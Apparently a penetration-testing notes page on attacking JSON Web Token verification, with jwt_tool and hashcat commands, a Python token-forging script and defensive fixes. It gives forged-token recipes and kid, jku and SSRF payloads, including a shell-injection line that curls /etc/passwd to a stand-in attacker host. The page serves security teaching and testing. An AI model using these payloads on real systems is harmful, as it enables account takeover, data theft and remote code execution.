+++
title = 'JSON Web Tokens (JWTs)'
date = 2026-10-30
type = 'notes'
weight = 50
toc = true
tags = ['web', 'web-attacks', 'jwt', 'authentication']
+++

JSON Web Token (JWT) is a format for transmitting cryptographically secure data, typically used as a stateless session token. The server verifies the token's signature and then retrieves user information from the JWT claims.

A JWT has three **base64url-encoded** parts separated by dots:

```
<Base64_Header>.<Base64_Payload>.<Base64_Signature>
```

- **Header** — metadata, including the signing `alg` (algorithm) and optional key identifiers (`kid`, `jwk`, `jku`).
- **Payload** — the claims (registered and custom).
- **Signature** — computed over the header and payload using a key, per the algorithm in the header.

If any part of the header or payload is modified, the signature no longer matches — **unless the server's verification logic is flawed**. That is what every attack in this file targets: not the cryptography, but the **verification code path**.

> **2025–2026 context:** JWT vulnerabilities have shifted from "the secret is weak" to "the library's key-resolution logic is wrong." The 2025–2026 CVE feed is dominated by **algorithm-confusion bugs in libraries** (PyJWT CVE-2026-48526, libjwt CVE-2026-44699, fast-jwt CVE-2026-107724), **embedded-JWK fallback** (Authlib CVE-2026-27962), and **kid-driven SSRF/path traversal** (SmallRye JWT CVE-2026-81829). The common thread: the developer wrote correct code, and the **library silently fell through to a weaker path** when a key lookup returned `None`.

---

## 1. Tools and Resources

| Tool | What it does |
|---|---|
| [jwt.io](https://jwt.io/) / [jwt.lannysport.net](https://jwt.lannysport.net/) | Decode and inspect tokens |
| [CyberChef](https://gchq.github.io/CyberChef/) | `JWT Sign` / `JWT Decode` operations for manual forging |
| [jwt_tool](https://github.com/ticarpi/jwt_tool) | The primary toolkit — decode, validate, forge, crack, scan, and run the full attack suite (`--exploit`, `--crack`, `--mode`). Adds RSA/ECDSA key generation and reconstruction from JWKS, timestamp tampering, and **rate-limiting for all attacks** |
| [rsa_sign2n](https://github.com/silentsignal/rsa_sign2n) | Recovers an RSA public key from two RS256 JWTs — the prerequisite for algorithm confusion |
| [jwt-pwn](https://github.com/Wang-SecurityResearch/jwt-pwn) | **2026 tool** with dedicated `kid-sqli` and `kid-path` modes |
| **hashcat** (`-m 16500`) | GPU-accelerated HMAC secret cracking — the fastest way to crack a weak HS256 secret |
| [jwt.secrets.list](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list) | Purpose-built weak-secret wordlist |
| **john** (`--format=HMAC-SHA256`) | CPU alternative to hashcat |
| **interactsh / Burp Collaborator** | OOB confirmation for `jku`/`kid` SSRF and blind injection |

**jwt_tool quick reference:**

```bash
# Decode and inspect
python3 jwt_tool.py <JWT>

# Run the full attack scan
python3 jwt_tool.py <JWT> -M at

# Crack an HMAC secret
python3 jwt_tool.py <JWT> -C -d /path/to/wordlist.txt

# Exploit alg:none
python3 jwt_tool.py <JWT> -X a

# Algorithm confusion (public key known)
python3 jwt_tool.py <JWT> -X k -pk public.pem

# kid injection
python3 jwt_tool.py <JWT> -X i
```

---

## 2. Attacking Signature Verification

### 2.1 No signature verification

The simplest misconfiguration: the application **accepts a token without checking its signature**. Manipulate the claims directly — change `role` to `admin`, change `sub` to another user — and resend. No key, no algorithm, no bypass technique.

```bash
# Decode, change the payload, re-encode the header and payload,
# and leave the original signature in place (or use any value)
```

If the modified claims are honoured, the signature is not verified.

### 2.2 `alg: none`

Set the header's `alg` to `none` and remove the signature — but **keep the trailing dot**:

```
<Base64_Header_with_alg_none>.<Base64_Payload>.
```

Some libraries accept `none` in any case (`None`, `NONE`, `nOnE`), so test case variants if the literal `none` is rejected. The SharePoint CVE-2026-55040 exploit chain uses exactly this: an **outer** JWT with `alg: none` and no signature, combined with SharePoint's own STS certificate thumbprint, to impersonate any user including administrators.

```bash
python3 jwt_tool.py <JWT> -X a
```

### 2.3 Algorithm confusion (RS256 → HS256)

**The vulnerability:** the server uses an **asymmetric** algorithm (RS256) — signing with a private key, verifying with a public key. If it **trusts the `alg` header** and the developer allowed both HS256 and RS256, an attacker can:

1. Obtain the **public key** (it is public — from the JWKS endpoint, the TLS certificate, or `rsa_sign2n`).
2. Forge a token with `alg: HS256`.
3. Sign it using the **public key bytes** as the HMAC secret.
4. The server verifies the HS256 signature with the public key — and accepts the forged token.

**Why 2026 libraries still fail at this:** the correct fix is to ignore the `alg` header and use a server-side configured algorithm. Libraries that instead **validate the key against the algorithm** have repeatedly got the validation wrong:

| CVE | Library | Failure |
|---|---|---|
| **CVE-2026-48526** | PyJWT | Accepts a raw-JSON JWK as an HMAC secret when `algorithms=["HS256","RS256"]` and `key=` is a JWK JSON object. PyJWT's PEM/SSH guard **does not cover JSON Web Keys** |
| **CVE-2026-44699** | libjwt 3.0.0–3.3.2 | An RSA JWK **without an `alg` field** is accepted for HS256 — the OpenSSL backend then runs HMAC with a **zero-length key**, so anyone can forge a token without knowing any secret |
| **CVE-2026-107724** | fast-jwt ≤ 6.2.4 | Serialized public JWK/JWKS JSON is classified as **HMAC key material** because `performDetectPublicKeyAlgorithms` treats non-PEM strings as symmetric keys |
| **CVE-2026-34950** | fast-jwt | Re-introduced the exact algorithm-confusion bug patched as CVE-2023-48223 |

> **The pattern across all four:** the library tries to be helpful by **detecting** whether a key is symmetric or asymmetric. The detection is heuristic, the attacker controls the input, and the heuristic fails. The only durable fix is an **explicit algorithm allowlist** that does not include HS* alongside RS*/ES*, plus a **strict key-type check** that rejects JWK objects where a PEM or raw secret is expected.

**Exploitation steps:**

**Step 1 — obtain the public key.**

```bash
# From the JWKS endpoint
curl https://target/.well-known/jwks.json

# From the TLS certificate
openssl s_client -connect target:443 -showcerts </dev/null 2>/dev/null | openssl x509 -pubkey -noout

# From two JWTs (if the key is not published)
docker build -t sig2n https://github.com/silentsignal/rsa_sign2n.git#main:standalone
docker run -it sig2n /bin/bash
python3 jwt_forgery.py <JWT1> <JWT2>
# The tool writes filename_x509.pem candidates and pre-forged HS256 tokens
```

**Step 2 — forge an HS256 token with the public key as the secret.** Use CyberChef's `JWT Sign`, setting the algorithm to HS256 and pasting the **full PEM, including the trailing newline**. Or, with jwt_tool:

```bash
python3 jwt_tool.py <JWT> -X k -pk public.pem
```

**Step 3 — test.** If the server accepts the token, the vulnerability is confirmed.

---

## 3. Cracking the HMAC Secret

HS256, HS384, and HS512 use a **shared secret** for both signing and verification. If the secret is weak, it can be brute-forced offline, and once recovered you can sign any token.

```bash
# hashcat — GPU, dedicated JWT mode
hashcat -a 0 -m 16500 jwt.txt /path/to/wordlist.txt

# john — CPU alternative
john --format=HMAC-SHA256 jwt.txt
```

`hashcat -m 16500` is **dedicated to HMAC JWT tokens**; on a modern GPU, `rockyou.txt` cracks most developer-chosen secrets in under a minute.

**Wordlists beyond `rockyou.txt`:**

- [wallarm/jwt-secrets](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list) — purpose-built for JWT HMAC secrets
- [BBhacKing/jwt_secrets](https://github.com/BBhacKing/jwt_secrets/blob/master/jwt_secrets_all.txt)
- [SecLists scraped-JWT-secrets](https://github.com/danielmiessler/SecLists/blob/master/Passwords/scraped-JWT-secrets.txt)

Once cracked, forge any token with CyberChef's `JWT Sign` or `jwt_tool`:

```bash
python3 jwt_tool.py <JWT> -T   # tamper interactively, re-sign with the cracked secret
```

---

## 4. `kid` Header Injection

The `kid` (Key ID) tells the server **which key** to use. If the server uses the `kid` value **without sanitisation** to look up that key, the lookup becomes an injection surface. There are **five injection types**, and the goal is always the same: make the server use a key the attacker controls, then sign with that key.

| Injection type | CWE | Primitive |
|---|---|---|
| **Path traversal** | CWE-22 | Read an arbitrary file as the HMAC key |
| **SQL injection** | CWE-89 | Control the key returned by the query |
| **OS command injection** | CWE-78 | Execute a command during key lookup → **RCE** |
| **NoSQL injection** | — | Control the returned key via an operator |
| **LDAP injection** | CWE-90 | Manipulate the directory lookup |

### 4.1 Path traversal — `/dev/null`

The simplest and most reliable payload:

```json
{"alg": "HS256", "kid": "../../../dev/null"}
```

If the server reads `"/keys/" + kid`, it opens `/dev/null`, which is **empty**. The effective HMAC key is `b""` (zero bytes). Sign the forged token with an **empty HMAC secret** and the server accepts it.

```bash
# Forge with jwt_tool and an empty key
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../../dev/null" -S hs256 -p ""
```

Other known-content files work the same way — `/proc/sys/kernel/randomize_va_space` is a common target because its contents are predictable.

### 4.2 SQL injection

```json
{"alg": "HS256", "kid": "1' UNION SELECT 'attackersecret' --"}
```

The query `SELECT key FROM keys WHERE kid = '1' UNION SELECT 'attackersecret' --` returns `attackersecret`, which becomes the verification key. Sign the forged token with that value.

### 4.3 OS command injection — the highest severity

```json
{"alg": "HS256", "kid": "key1; curl attacker.com/$(cat /etc/passwd)"}
```

If `kid` is passed to a shell during key loading, this is **RCE on the server** — CWE-78, the most severe variant of the class.

> **`kid` injection is CWE-347 (Improper Verification of Cryptographic Signature) under OWASP A04:2025**, not merely the injection CWE it uses as a vector. The outcome that matters is a forged, "validly signed" token — the injection technique is just the route to the key lookup.

---

## 5. `jwk` Header Injection

The `jwk` header lets a token **embed its own verification key**. **RFC 7515 §4.1.3** explicitly marks this as **NOT RECOMMENDED**, because a key supplied by the token submitter cannot be trusted as a verification anchor. RFC 7515 §5.2 requires the verification key to come from the **application context**, not the token.

When the server trusts the embedded `jwk`, the attack is trivial:

1. Generate an RSA or EC keypair.
2. Forge a JWT with arbitrary claims (`{"role":"admin"}`).
3. Sign it with **your private key**.
4. Embed **your public key** in the `jwk` header.
5. The server verifies with the embedded key — and accepts the token.

**Generating the keys:**

```bash
openssl genpkey -algorithm RSA -out exploit_private.pem -pkeyopt rsa_keygen_bits:2048
openssl rsa -pubout -in exploit_private.pem -out exploit_public.pem
```

**Forging the token** (Python, using `python-jose` and `pyjwt`):

```python
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from jose import jwk
import jwt

payload = {"sub": "administrator", "role": "admin"}

with open("exploit_public.pem", "rb") as f:
    public_key_pem = f.read()
public_key = serialization.load_pem_public_key(public_key_pem, backend=default_backend())
jwk_key = jwk.construct(public_key, algorithm="RS256")
jwk_dict = jwk_key.to_dict()

with open("exploit_private.pem", "rb") as f:
    private_key_pem = f.read()

token = jwt.encode(payload, private_key_pem, algorithm="RS256", headers={"jwk": jwk_dict})
print(token)
```

### 5.1 The 2026 library-fallback bug — CVE-2026-27962 (Authlib)

The critical 2026 finding is that the developer **does not have to write `key=header["jwk"]`** for this to happen. Authlib's `JsonWebSignature._prepare_algorithm_key()` contains:

```python
elif key is None and "jwk" in header:
    key = header["jwk"]   # attacker-controlled key
```

The most common trigger is a **JWKS key resolver**:

```python
def lookup_key(header, payload):
    kid = header.get("kid")
    return jwks_cache.get(kid)   # returns None when kid is unknown/rotated

jws.deserialize_compact(token, lookup_key)
```

When the attacker supplies an **unknown `kid`**, the resolver legitimately returns `None` — and the library **silently falls through to the attacker's embedded `jwk`**. The developer never wrote `key=None`; the library's fallback logic introduced it. The signature passes, and the forged claims are returned as authentic.

> **Fixed in Authlib 1.6.9.** The same fallback pattern was found in **jose** (CVE-2026-34240) and **authlib** (CVE-2026-27962) — both allow a header-provided `jwk` to become a verification candidate even when it is absent from the trusted key store.

---

## 6. `jku` Header Injection and SSRF

The `jku` header supplies a **URL** that serves the key set, rather than the key itself. If the server fetches that URL without validation:

1. Host a JWKS file on your server containing **your** public key.
2. Set the token's `jku` to that URL.
3. **Set the `kid` to match the key ID in your hosted JWKS exactly** — the server uses it to select the key.
4. Sign with your private key; the server fetches your JWKS and verifies successfully.

```json
{
  "alg": "RS256",
  "kid": "attacker-key-1",
  "jku": "https://attacker.com/jwks.json"
}
```

### 6.1 `jku` → SSRF

The server fetches the `jku` URL **before** verifying the signature. That makes it an **unauthenticated SSRF primitive**:

- **Internal services** — `jku` pointing at `http://127.0.0.1:8080/...`
- **Cloud metadata** — `jku` pointing at `http://169.254.169.254/latest/meta-data/...`
- **Local file read** — `jku: file:///etc/passwd` (if the fetcher honours `file://`)

**CVE-2026-48522 (PyJWT < 2.13.0)** — `PyJWKClient` passes the `uri` argument directly to `urllib.request.urlopen()`, which registers `HTTPHandler`, `HTTPSHandler`, `FTPHandler`, `FileHandler`, and `DataHandler`. There is **no option to restrict the scheme**, so an attacker-influenced `jku` can read local files via `file://`, attempt FTP fetches, or use `data:` URIs — a broader SSRF surface than just HTTP.

**CVE-2026-81829 (SmallRye JWT / Apicurio Registry)** — the `AwsAlbKeyResolver` builds the key-fetch URL by **directly concatenating the attacker-controlled `kid`** without sanitising path traversal or query-string separators. This forces the server to issue GET requests to **arbitrary paths on the same origin** as the configured key endpoint — reading non-public endpoints and internal data **before signature verification** takes place.

> **The key distinction:** a `jku` SSRF does not require the attacker to obtain a valid token — the fetch happens during verification. That makes it an **unauthenticated** vulnerability, which is why the 2026 CVEs rate it critical.

---

## 7. Other Techniques

### 7.1 `x5u` / `x5c` injection

`x5u` is the X.509 URL counterpart to `jku`; `x5c` embeds the certificate chain directly. Both follow the same trust pattern: if the server uses the supplied certificate to verify the signature, an attacker-supplied chain validates an attacker-signed token.

### 7.2 `kid` with command injection

Covered in §4.3 — the highest-severity `kid` variant. Any place the `kid` reaches a shell (`subprocess.run(f"load-key {kid}")`) is RCE.

### 7.3 JWT revocation bypass (CVE-2026-53613)

PyJWT 2.13.0 accepts compact JWS signature segments containing characters **outside the Base64URL alphabet**. Appending non-canonical characters to the signature segment creates a token that is **byte-different** from the original but **verifies identically** — bypassing revocation checks that match on the raw token string.

### 7.4 `b64` header and payload-size DoS (CVE-2026-48525)

Azure CLI's JWT parsing accepted an arbitrarily large Base64URL payload segment, forcing **CPU and memory exhaustion** — a denial-of-service primitive through the token parser itself.

### 7.5 Refresh-endpoint method confusion (CVE-2026-82469)

Rodauth accepted **valid access tokens at the refresh route via non-POST methods** (e.g. `GET`), letting an attacker convert a temporary token into a **new valid access token** indefinitely. This is not a signature bypass — it is an **endpoint-logic** flaw that abuses the token's validity.

### 7.6 Sensitive claims and mass assignment

Always inspect the payload for `role`, `is_admin`, `tenant`, `org`, and `features` claims. If the server **trusts the claim** rather than deriving authorisation from the database, a signature bypass is not even required — a mis-issued token or a self-service registration that sets the claim is enough.

---

## 8. Recent JWT CVEs (2025–2026)

| CVE | Product | Primitive |
|---|---|---|
| **CVE-2026-48526** | PyJWT | Public-key JWK accepted as HMAC secret when HS* and RS* are both allowed |
| **CVE-2026-44699** | libjwt 3.0.0–3.3.2 | RSA JWK without `alg` → HMAC with **zero-length key** |
| **CVE-2026-107724** | fast-jwt ≤ 6.2.4 | Serialized public JWK classified as HMAC secret |
| **CVE-2026-34950** | fast-jwt | Re-introduced algorithm confusion (regression of CVE-2023-48223) |
| **CVE-2026-27962** | Authlib < 1.6.9 | `key=None` fallback to attacker-controlled `jwk` header |
| **CVE-2026-34240** | jose | Untrusted `jwk` header accepted during verification |
| **CVE-2026-48522** | PyJWT < 2.13.0 | `jku` → SSRF via `file://`, FTP, `data:` |
| **CVE-2026-81829** | SmallRye JWT | `kid` path traversal → SSRF on key-fetch URL, pre-verification |
| **CVE-2026-39413** | LightRAG < 1.4.14 | `alg: none` algorithm confusion |
| **CVE-2025-68925** | Jervis < 2.2 | Does not validate that the header specifies `alg: RS256` |
| **CVE-2026-55040** | SharePoint | `alg: none` outer token + STS thumbprint → impersonate any user |
| **CVE-2026-53613** | PyJWT 2.13.0 | Non-canonical signature segments bypass raw-token revocation |
| **CVE-2026-82469** | Rodauth | Refresh via `GET` → indefinite access-token renewal |
| **CVE-2026-48525** | Azure CLI | `b64` header with oversized payload → CPU/memory DoS |

---

## 9. Testing Methodology

```bash
# 1. Decode the token and read every header and claim
python3 jwt_tool.py <JWT>

# 2. Test the trivial bypasses first
#    - Strip the signature entirely
#    - Set alg to none (try none/None/NONE/nOnE)
#    - Modify a claim and keep the original signature

# 3. Check whether the server trusts the alg header
#    - Obtain the public key (JWKS, TLS cert, or rsa_sign2n)
#    - Forge an HS256 token signed with the public key bytes
#    - Test it

# 4. Crack a weak HMAC secret
hashcat -a 0 -m 16500 jwt.txt /path/to/jwt.secrets.list

# 5. Test header-injection surfaces
#    kid  → path traversal (../../../dev/null), SQLi, command injection
#    jwk  → embed your own public key
#    jku  → host your JWKS; also test file://, internal URLs, metadata IP
#    x5u  → same as jku, with an X.509 certificate

# 6. Test endpoint logic
#    - Send a valid token to the refresh route via GET
#    - Append non-canonical characters to the signature
#    - Check for sensitive claims that the server trusts

# 7. Confirm OOB where the server fetches a URL (jku, x5u)
interactsh-client
```

---

## 10. Field Notes

- **The algorithm-confusion bug is not dead — it moved into libraries.** CVE-2026-48526, CVE-2026-44699, and CVE-2026-107724 are all heuristic key-type detection failing. The fix is an **explicit algorithm allowlist** and a **strict key-type check**, not a better heuristic.
- **`kid` path traversal to `/dev/null` is the fastest win.** Sign with an empty HMAC secret — one request, no cracking.
- **`kid` command injection is RCE, not just an auth bypass.** Check whether the value reaches a shell during key loading.
- **The `jwk` header should be rejected outright.** RFC 7515 marks it NOT RECOMMENDED for exactly this reason. Authlib's CVE-2026-27962 shows why: a legitimate `key=None` return from a JWKS resolver **silently falls through** to the attacker's key.
- **`jku` and `x5u` are unauthenticated SSRF primitives.** The fetch happens **before** signature verification, so no valid token is required.
- **Restrict the fetch scheme.** PyJWT's CVE-2026-48522 is exploitable because `urllib.request.urlopen()` accepts `file://`, FTP, and `data:` — allow only `https://`.
- **`alg: none` is still used in real exploit chains** — SharePoint CVE-2026-55040 combined it with a stolen STS thumbprint to impersonate administrators.
- **Revocation can be bypassed by non-canonical encoding.** Appending characters outside the Base64URL alphabet produces a byte-different token that verifies identically.
- **Endpoint logic counts.** Rodauth's refresh-via-GET bug is not a signature bypass — it is a valid token used in a way the developer did not intend.
- **Decode first, exploit second.** The armourinfosec guidance is explicit: decode the token, then walk every attack class — do not stop because "it is signed".
